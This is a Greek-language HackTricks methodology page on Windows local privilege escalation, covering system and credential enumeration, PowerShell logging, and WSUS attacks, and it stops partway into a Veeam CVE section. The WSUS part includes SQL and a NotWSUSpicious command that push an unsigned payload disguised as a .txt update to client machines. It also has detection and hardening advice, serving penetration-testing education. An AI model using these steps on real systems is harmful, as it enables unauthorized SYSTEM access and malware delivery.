# Κλιμάκωση προνομίων σε τοπικά συστήματα Windows

{{#include ../../banners/hacktricks-training.md}}

### **Καλύτερο εργαλείο για τον εντοπισμό διανυσμάτων κλιμάκωσης τοπικών προνομίων στα Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Αυτή η σελίδα συγκεντρώνει τη γενική μεθοδολογία κλιμάκωσης προνομίων στα Windows από αρκετούς βασικούς οδηγούς.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Η πρακτική ροή enumeration βασίζεται επίσης σε εργαστήρια και checklists της κοινότητας.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Το ιστορικό υλικό επιθέσεων περιλαμβάνει την παρουσίαση του DerbyCon για την κλιμάκωση προνομίων στα Windows.<sup>[[5]](#references)</sup>

## Αρχική θεωρία των Windows

### Access Tokens

**Αν δεν γνωρίζετε τι είναι τα access tokens των Windows, διαβάστε την ακόλουθη σελίδα πριν συνεχίσετε:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Για περισσότερες πληροφορίες σχετικά με τα ACLs - DACLs/SACLs/ACEs, δείτε την ακόλουθη σελίδα:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Αν δεν γνωρίζετε τι είναι τα integrity levels στα Windows, διαβάστε την ακόλουθη σελίδα πριν συνεχίσετε:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Μηχανισμοί ασφαλείας των Windows

Στα Windows υπάρχουν διάφοροι μηχανισμοί που μπορεί να **σας εμποδίσουν να κάνετε enumeration του συστήματος**, να εκτελέσετε εκτελέσιμα αρχεία ή ακόμη και να **εντοπίσουν τις δραστηριότητές σας**. Πριν ξεκινήσετε το enumeration για κλιμάκωση προνομίων, θα πρέπει να **διαβάσετε** την ακόλουθη **σελίδα** και να κάνετε **enumeration** όλων αυτών των **μηχανισμών** **άμυνας**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Η φυσική πρόσβαση μπορεί επίσης να μετατρέψει μια offline επεξεργασία του UEFI NVRAM σε αλυσίδα DMA πριν από την εκκίνηση και τροποποίησης μνήμης των Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / αθόρυβη ανύψωση μέσω UIAccess

Οι διεργασίες UIAccess που εκκινούνται μέσω του `RAiLaunchAdminProcess` μπορούν να χρησιμοποιηθούν καταχρηστικά για πρόσβαση σε High IL χωρίς προτροπές, όταν παρακάμπτονται οι έλεγχοι ασφαλών διαδρομών του AppInfo. Δείτε εδώ τη σχετική ροή παράκαμψης UIAccess/Admin Protection:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Η διάδοση ρυθμίσεων μητρώου προσβασιμότητας του Secure Desktop μπορεί να χρησιμοποιηθεί καταχρηστικά για αυθαίρετη εγγραφή στο μητρώο ως SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Οι πρόσφατες εκδόσεις των Windows εισήγαγαν επίσης ένα μονοπάτι LPE μέσω **SMB αυθαίρετης θύρας**, όπου ένας προνομιακός τοπικός έλεγχος ταυτότητας NTLM ανακλάται μέσω μιας επαναχρησιμοποιούμενης σύνδεσης SMB TCP:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Πληροφορίες συστήματος

### Enumeration πληροφοριών έκδοσης

Ελέγξτε αν η έκδοση των Windows έχει γνωστές ευπάθειες (ελέγξτε επίσης τις εφαρμοσμένες ενημερώσεις ασφαλείας).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploits έκδοσης

Αυτός ο [ιστότοπος](https://msrc.microsoft.com/update-guide/vulnerability) είναι χρήσιμος για την αναζήτηση λεπτομερών πληροφοριών σχετικά με ευπάθειες ασφαλείας της Microsoft. Αυτή η βάση δεδομένων περιλαμβάνει περισσότερες από 4.700 ευπάθειες ασφαλείας, αναδεικνύοντας την **τεράστια επιφάνεια επίθεσης** που παρουσιάζει ένα περιβάλλον Windows.

**Στο σύστημα**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — καταγράφει το build του OS, τις εγκατεστημένες ενημερώσεις και πιθανά σχετικά advisories· πριν θεωρήσετε ότι ένα αποτέλεσμα ισχύει, επαληθεύστε το ακριβές προϊόν και τις ενημερώσεις που το αντικαθιστούν.

Για ένα local exploit που αφορά συγκεκριμένη έκδοση, ελέγξτε την **αρχιτεκτονική της διεργασίας που εκτελείται**, καθώς και την αρχιτεκτονική του OS. Σε Windows 64-bit, μια διεργασία 32-bit υπόκειται στην [ανακατεύθυνση του συστήματος αρχείων WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): το `%windir%\System32` συνήθως αντιστοιχεί στον κατάλογο συστήματος 32-bit, ενώ το `%windir%\Sysnative` επιτρέπει σε αυτή τη διεργασία πρόσβαση στον εγγενή κατάλογο συστήματος. Το alias δεν είναι διαθέσιμο σε διεργασία 64-bit. Ένα build του OS ή μια πιθανή ελλείπουσα KB δεν αποδεικνύει ότι είναι εφικτό το exploit· συγκρίνετε το build που εκτελείται, την εγκατεστημένη ενημέρωση ή την ενημέρωση που την αντικαθιστά, την αρχιτεκτονική της διεργασίας και τις προϋποθέσεις του exploit με το [δελτίο ασφαλείας της Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) για το συγκεκριμένο ζήτημα.

**Τοπικά με πληροφορίες συστήματος**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos με exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Περιβάλλον

Υπάρχουν πληροφορίες credential/Juicy αποθηκευμένες στις μεταβλητές περιβάλλοντος;

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Ιστορικό PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Αρχεία PowerShell Transcript

Μπορείτε να μάθετε πώς να ενεργοποιήσετε αυτήν τη δυνατότητα εδώ: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` είναι απλώς ένα παράδειγμα. Η [πολιτική καταγραφής PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) αποθηκεύει συνήθως τα αρχεία στον φάκελο Documents κάθε χρήστη, αλλά μια ρύθμιση `OutputDirectory` ή η εντολή `Start-Transcript -OutputDirectory` μπορεί να ανακατευθύνει τα αρχεία σε κοινόχρηστο ή κρυφό φάκελο. Ελέγξτε την πραγματική διαδρομή εξόδου και τα ACL του αρχείου πριν εξετάσετε μια καταγραφή: μπορεί να περιέχει ορίσματα εντολών και έξοδο, συμπεριλαμβανομένων διαπιστευτηρίων. Μια προσβάσιμη καταγραφή αποτελεί χρήσιμο στοιχείο μόνο αν το περιεχόμενό της αποκαλύπτει μια αξιοποιήσιμη ταυτότητα με υψηλότερα προνόμια και αυτή η ταυτότητα μπορεί να συνδεθεί στο σχετικό περιβάλλον.

### PowerShell Module Logging

Καταγράφονται λεπτομέρειες των εκτελέσεων pipeline του PowerShell, συμπεριλαμβανομένων των εντολών που εκτελέστηκαν, των κλήσεων εντολών και τμημάτων των scripts. Ωστόσο, ενδέχεται να μην καταγράφονται όλες οι λεπτομέρειες εκτέλεσης και τα αποτελέσματα εξόδου.

Για να το ενεργοποιήσετε, ακολουθήστε τις οδηγίες της ενότητας "Αρχεία καταγραφής" στην τεκμηρίωση και επιλέξτε **"Module Logging"** αντί για **"PowerShell Transcription"**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Για να δείτε τα τελευταία 15 συμβάντα από τα αρχεία καταγραφής του PowerShell, μπορείτε να εκτελέσετε:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Καταγράφεται πλήρες ιστορικό δραστηριότητας και όλο το περιεχόμενο της εκτέλεσης του script, διασφαλίζοντας ότι κάθε μπλοκ κώδικα τεκμηριώνεται καθώς εκτελείται. Αυτή η διαδικασία διατηρεί ένα ολοκληρωμένο αρχείο ελέγχου κάθε δραστηριότητας, χρήσιμο για εγκληματολογική ανάλυση και την εξέταση κακόβουλης συμπεριφοράς. Η τεκμηρίωση όλης της δραστηριότητας κατά την εκτέλεση παρέχει λεπτομερείς πληροφορίες για τη διαδικασία.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Τα συμβάντα καταγραφής για το Script Block βρίσκονται στο Windows Event Viewer, στη διαδρομή: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Για να δείτε τα 20 πιο πρόσφατα συμβάντα, μπορείτε να χρησιμοποιήσετε:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Ρυθμίσεις Internet

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Μονάδες δίσκου

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Ένα HTTP WSUS endpoint αποτελεί ένδειξη προς διερεύνηση για πιθανή παρεμβολή στα μεταδεδομένα ενημερώσεων. Η εκμετάλλευση εξαρτάται επίσης από το αν ο client χρησιμοποιεί αυτόν τον WSUS server, αν ο επιτιθέμενος μπορεί να υποκλέψει ή να ελέγξει την κίνησή του και από τις πολιτικές εμπιστοσύνης και εγκατάστασης ενημερώσεων του client. Το URL από μόνο του δεν συνεπάγεται εκτέλεση κώδικα. [Η Microsoft συνιστά TLS για τα μεταδεδομένα WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Ξεκινάτε ελέγχοντας αν το δίκτυο χρησιμοποιεί ενημέρωση WSUS χωρίς SSL, εκτελώντας την ακόλουθη εντολή στο cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ή το παρακάτω στο PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Αν λάβετε μια απάντηση όπως κάποια από τις παρακάτω:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Και αν τα `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ή `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` είναι ίσα με `1`.

Όταν το `UseWUServer` είναι `1`, το Windows Update χρησιμοποιεί την καθορισμένη υπηρεσία intranet. Αυτό επιβεβαιώνει μια προϋπόθεση για τη διαδρομή υποκλοπής HTTP, αλλά δεν αποδεικνύει ότι είναι δυνατή η υποκλοπή, η αποδοχή κακόβουλων ενημερώσεων ή η εγκατάσταση με αυξημένα δικαιώματα. Όταν είναι `0`, αυτό το συγκεκριμένο ρυθμισμένο WSUS endpoint δεν επιλέγεται από αυτήν την πολιτική.

Για να εκμεταλλευτείτε αυτά τα vulnerabilities, μπορείτε να χρησιμοποιήσετε εργαλεία όπως τα [Wsuxploit](https://github.com/pimps/wsuxploit) και [pyWSUS ](https://github.com/GoSecure/pywsus)- Πρόκειται για MiTM weaponized exploit scripts που εισάγουν «ψεύτικες» ενημερώσεις σε μη κρυπτογραφημένη κίνηση WSUS.

Διαβάστε την έρευνα εδώ:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Διαβάστε την πλήρη αναφορά εδώ**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Βασικά, αυτό είναι το ελάττωμα που εκμεταλλεύεται αυτό το bug:

> Αν έχουμε τη δυνατότητα να τροποποιήσουμε τον proxy του τοπικού χρήστη μας και το Windows Update χρησιμοποιεί τον proxy που έχει ρυθμιστεί στις ρυθμίσεις του Internet Explorer, τότε μπορούμε να εκτελέσουμε το [PyWSUS](https://github.com/GoSecure/pywsus) τοπικά, να υποκλέψουμε τη δική μας κίνηση και να εκτελέσουμε κώδικα ως χρήστης με αυξημένα δικαιώματα στο asset μας.
>
> Επιπλέον, καθώς η υπηρεσία WSUS χρησιμοποιεί τις ρυθμίσεις του τρέχοντος χρήστη, χρησιμοποιεί και το certificate store του. Αν δημιουργήσουμε ένα self-signed certificate για το hostname του WSUS και προσθέσουμε αυτό το certificate στο certificate store του τρέχοντος χρήστη, θα μπορέσουμε να υποκλέψουμε κίνηση WSUS τόσο μέσω HTTP όσο και μέσω HTTPS. Το WSUS δεν χρησιμοποιεί μηχανισμούς παρόμοιους με το HSTS για την εφαρμογή ελέγχου εμπιστοσύνης τύπου trust-on-first-use στο certificate. Αν ο χρήστης εμπιστεύεται το certificate που παρουσιάζεται και αυτό έχει το σωστό hostname, η υπηρεσία θα το αποδεχτεί.

Μπορείτε να εκμεταλλευτείτε αυτό το vulnerability χρησιμοποιώντας το εργαλείο [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (μόλις γίνει διαθέσιμο).

### Ενημερώσεις WSUS υπό τον έλεγχο διαχειριστή

Υπάρχει ξεχωριστή διαδρομή όταν η τρέχουσα ταυτότητα μπορεί να **δημοσιεύει και να εγκρίνει** ενημερώσεις σε έναν WSUS server. Ελέγξτε την πραγματική συμμετοχή στην ομάδα `WSUS Administrators` του server και τυχόν εκχωρημένα δικαιώματα WSUS, και στη συνέχεια προσδιορίστε την ομάδα υπολογιστών-πελατών που θα λάβει μια εγκεκριμένη ενημέρωση. Η [Microsoft απαιτεί δικαιώματα WSUS Administrator για την έγκριση ενημερώσεων](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) και [τεκμηριώνει τη σχέση εμπιστοσύνης για τη δημοσίευση](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): οι clients πρέπει να εμπιστεύονται το certificate υπογραφής που χρησιμοποιείται για το περιεχόμενο που δημοσιεύεται τοπικά. Πριν θεωρήσετε ότι πρόκειται για διαδρομή κλιμάκωσης προνομίων, επιβεβαιώστε ότι η υποψήφια ενημέρωση είναι υπογεγραμμένη και γίνεται αποδεκτή, εφαρμόζεται στον στόχο και εγκαθίσταται σε πιο προνομιούχο πλαίσιο. Μια τιμή HTTP `WUServer` ή ένα όνομα ομάδας από μόνα τους δεν αποδεικνύουν ότι ισχύουν αυτές οι προϋποθέσεις.

### Κατάχρηση προσαρμοσμένων ενημερώσεων SUSDB: unsigned payloads μέσω `.txt`/`.esd`

Πρόκειται για διαφορετική αστοχία ορίου εμπιστοσύνης από την υποκλοπή σύνδεσης HTTP WSUS: η προϋπόθεση είναι να έχετε επαρκή πρόσβαση στις **stored procedures της βάσης δεδομένων WSUS (`SUSDB`)** ώστε να δημοσιεύσετε και να εγκρίνετε μια προσαρμοσμένη ενημέρωση. Μια πρακτική αρχική διαδρομή είναι η αναμετάδοση του λογαριασμού υπολογιστή ενός upstream WSUS server σε ξεχωριστό MSSQL server που φιλοξενεί τη `SUSDB`. Η ακριβής προϋπόθεση εξαρτάται από την εγκατάσταση, οπότε πρώτα απαριθμήστε τα δικαιώματα `EXECUTE` αντί να υποθέσετε ότι απαιτούνται δικαιώματα SQL administrator.<sup>[[38]](#references)[[39]](#references)</sup>

Για τη ξεχωριστή διαδρομή επίθεσης που αναμεταδίδει τον έλεγχο ταυτότητας WSUS client από HTTP/8530 σε LDAP, SMB ή AD CS, δείτε το [Abusing WSUS HTTP for NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Επιβεβαίωση της αναμετάδοσης προς εξωτερική βάση δεδομένων και των δικαιωμάτων στις procedures

Σε εγκαταστάσεις όπου το WSUS χρησιμοποιεί εξωτερικό SQL Server, ελέγξτε πρώτα αν ο λογαριασμός του WSUS server μπορεί να πραγματοποιήσει έλεγχο ταυτότητας στη βάση δεδομένων και αν η NTLM relay φτάνει σε αυτόν τον listener. Ο SQL ρόλος του server μπορεί να επιτρέπει πρόσβαση σε procedures δημοσίευσης ενημερώσεων ακόμη και όταν δεν επιτρέπονται άμεσες εγγραφές στους πίνακες· μια αποτυχημένη `UPDATE` στη `SUSDB` δεν αποδεικνύει ότι έχει αποκλειστεί η δημοσίευση. Επιθεωρήστε την ενεργή ταυτότητα, τη συμμετοχή σε ρόλους και τα δικαιώματα στις procedures σε μια εξουσιοδοτημένη SQL session πριν επιχειρήσετε να δημοσιεύσετε μια προσαρμοσμένη ενημέρωση.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Οι ορισμοί των live procedures και το εγκατεστημένο `SoftwareDistributionPackage.xsd` είναι χρήσιμα για την ανακατασκευή έγκυρων metadata ενημερώσεων. Τόσο το bundle parent όσο και το payload child χρειάζονται `UpdateIdentity` (τύπος fragment `1`), `LocalizedProperties` (`4`) και `ExtendedProperties` (`2)· καταγράψτε το local revision ID που επιστρέφει κάθε κλήση `spImportUpdate` και διατηρήστε συνεπή τη σχέση του bundle, τα digests, το μέγεθος, το content URL και το revision. Πρόκειται για stateful publishing workflow, επομένως μια επιτυχής κλήση stored procedure δεν αποδεικνύει από μόνη της εκτέλεση από την πλευρά του client.<sup>[[38]](#references)</sup>

#### Δημιουργία, στόχευση και έγκριση της ενημέρωσης

Το custom-update workflow χρησιμοποιεί νόμιμες WSUS procedures ως περιορισμένο publishing API. Οι σημαντικές μεταβάσεις κατάστασης είναι οι εξής:<sup>[[38]](#references)</sup>

| Στάδιο | Σχετικές stored procedures |
| --- | --- |
| Εισαγωγή metadata ενημέρωσης | `spImportUpdate` |
| Αποθήκευση prerequisite, localized και extended XML fragments | `spSaveXMLFragment` |
| Συσχέτιση του content digest με το URL που ελέγχεται από τον επιτιθέμενο | `spSetBatchURL` |
| Καταχώριση/δημιουργία ομάδας υπολογιστών και προσθήκη του client | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Έγκριση εγκατάστασης για αυτή την ομάδα | `spDeployUpdate` με `@actionID = 0` και `@isAssigned = 1` |

Το όνομα του αρχείου, τα digests, το μέγεθος και ο handler `CommandLineInstallation` πρέπει να συμφωνούν σε όλα τα imported metadata/fragments. Αφού οριστούν το content URL και η ομάδα-στόχος, η τελική έγκριση έχει περίπου την ακόλουθη μορφή· χρησιμοποιήστε νέα αναγνωριστικά ενημέρωσης, ομάδας και deployment αντί να επαναχρησιμοποιήσετε τα GUID του παραδείγματος.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Παράκαμψη υπογραφής μέσω επέκτασης

Το WSUS συνήθως απορρίπτει αυθαίρετο μη υπογεγραμμένο εκτελέσιμο περιεχόμενο. Ωστόσο, στο `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, η διαδρομή .NET `VerifyFile` ορίζει τη σημαία ελέγχου πιστοποιητικού σε false όταν το παρεχόμενο όνομα αρχείου τελειώνει σε `.txt` ή `.esd`. Έτσι, παραλείπεται η `CheckCertificateSignature` χωρίς να έχει προηγουμένως αποδειχθεί ότι τα bytes είναι κείμενο ή έγκυρη εικόνα ESD. Επομένως, ένα αμετάβλητο PE με όνομα, για παράδειγμα, `payload.exe.txt` μπορεί να περάσει την επαλήθευση περιεχομένου και αργότερα να εκκινηθεί από τον χειριστή εγκατάστασης γραμμής εντολών της ενημέρωσης. Πρόκειται για σφάλμα σύγχυσης πολιτικής/τύπου, όχι για πλαστογράφηση υπογραφής.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Staging και αυτοματοποίηση συμβατά με BITS

Η κλήση του `spDeployUpdate` κάνει το WSUS να ανακτήσει το καταχωρισμένο περιεχόμενο. Η προέλευση πρέπει να ικανοποιεί τις απαιτήσεις HTTP του BITS: δεν αρκεί να είναι προσβάσιμο ένα URL, καθώς η μεταφορά χρησιμοποιεί αρχικά μια ροή `HEAD`/`GET` και αιτήματα εύρους byte. Ένας server χωρίς υποστήριξη Range προκαλεί συμβάν συγχρονισμού WSUS `EventId=364`, το οποίο αναφέρει ότι το BITS απαιτεί την κεφαλίδα πρωτοκόλλου Range.<sup>[[39]](#references)</sup>

Το ερευνητικό PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) δημιουργεί τα SQL που απαιτούνται για την αλυσίδα import/fragment/URL/group/deployment, περιλαμβάνει τροποποιημένο MSSQL client για την εκτέλεσή τους και παρέχει το `BitsWebServer.py` για staging περιεχομένου. Μια ελάχιστη εντολή για εξουσιοδοτημένο lab είναι:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Μη επιτηρούμενη εκτέλεση και persistence μέσω επανάληψης

Η αλληλεπίδραση από την πλευρά του client εξαρτάται από την πολιτική. Η ρύθμιση `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, επιλογή `4 - Auto download and schedule install`, κάνει λήψη και εγκατάσταση μιας εγκεκριμένης ενημέρωσης σύμφωνα με το διαμορφωμένο πρόγραμμα, χωρίς να την επιλέξει χειροκίνητα ο χρήστης. Κατά τις δοκιμές, ένα payload του οποίου η ενημέρωση παρέμενε σε κατάσταση αποτυχίας/μη ολοκλήρωσης προσφερόταν ξανά αμέσως μετά τον τερματισμό της διεργασίας callback, επομένως η συμπεριφορά επανάληψης μπορεί να οδηγήσει σε recurring execution persistence· είναι θορυβώδης, επειδή ο client εμφανίζει κατάσταση αποτυχίας ενημέρωσης.<sup>[[39]](#references)</sup>

#### Σημεία ελέγχου για detection και hardening

Χρήσιμα σημεία ελέγχου από την πλευρά του server και του client για αυτή την αλυσίδα είναι τα εξής:<sup>[[39]](#references)</sup>

- Ελέγξτε την εκτέλεση των `spCreateTargetGroup`, `spSetBatchURL` και `spDeployUpdate` στο `SUSDB`· διερευνήστε νέες ομάδες στόχευσης, εξωτερικές πηγές περιεχομένου, payload ενημερώσεων `.txt`/`.esd` και deployments που πραγματοποιούνται από μη αναμενόμενους principals (ειδικά λογαριασμούς που δεν είναι υπολογιστές).
- Ελέγξτε το `C:\Program Files\Update Services\LogFiles` για `ContentSyncAgent`, `FileVerified`, το ανορθόγραφο `FileVerficationFailed` και `EventId=364`· συσχετίστε την επαλήθευση με την επέκταση του payload και το magic του περιεχομένου, αντί να εμπιστεύεστε την κατάληξη.
- Αναζητήστε επανειλημμένες αποτυχίες/επαναλήψεις εγκατάστασης του Windows Update και εκτέλεση PE ή μη αναμενόμενη δραστηριότητα child/network από περιεχόμενο με ονόματα `.txt` ή `.esd`.
- Απαιτήστε Extended Protection for Authentication στην υπηρεσία βάσης δεδομένων όπου υποστηρίζεται και περιορίστε την πρόσβαση στο δίκτυο της βάσης δεδομένων στον WSUS server και στα εξουσιοδοτημένα συστήματα διαχείρισης. Περιορίστε στο ελάχιστο και ελέγξτε τα δικαιώματα `EXECUTE` στις διαδικασίες custom-update.

## Third-Party Auto-Updaters και Agent IPC (local privesc)

Πολλοί εταιρικοί agents εκθέτουν μια επιφάνεια IPC στο localhost και ένα προνομιούχο κανάλι ενημέρωσης. Αν η διαδικασία enrollment μπορεί να εξαναγκαστεί να συνδεθεί σε server του attacker και ο updater εμπιστεύεται μια rogue root CA ή αδύναμους ελέγχους signer, ένας local user μπορεί να παραδώσει ένα κακόβουλο MSI που εγκαθίσταται από την υπηρεσία SYSTEM. Δείτε μια γενικευμένη τεχνική (βασισμένη στην αλυσίδα Netskope stAgentSvc – CVE-2025-0309) εδώ:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM μέσω TCP 9401)

Τα Veeam Backup & Replication και Cloud Connect χρησιμοποιούν μια βασική υπηρεσία backup στο **TCP/9401 από προεπιλογή**. Η [συμβουλευτική ανακοίνωση της Veeam](https://www.veeam.com/kb4424) περιγράφει μη αυθεντικοποιημένη αποκάλυψη διαπιστευτηρίων κρυπτογραφημένης βάσης δεδομένων ρυθμίσεων εντός της περιμέτρου του δικτύου backup· ένα ξεχωριστό δημόσιο PoC επιδεικνύει μια διαδρομή εκτέλεσης εντολών ως **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Η υπηρεσία μπορεί να κάνει bind πέρα από το localhost, επομένως ελέγξτε την πραγματική διεύθυνση και το PID της.

- **Αναγνώριση**: επιβεβαιώστε ότι το TCP/9401 ανήκει στο `Veeam.Backup.Service.exe` και, στη συνέχεια, ελέγξτε το εγκατεστημένο προϊόν και τα metadata των patches. Οι εντολές `netstat -ano | findstr 9401` και `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` είναι ενδείξεις, όχι πλήρης έλεγχος patch.
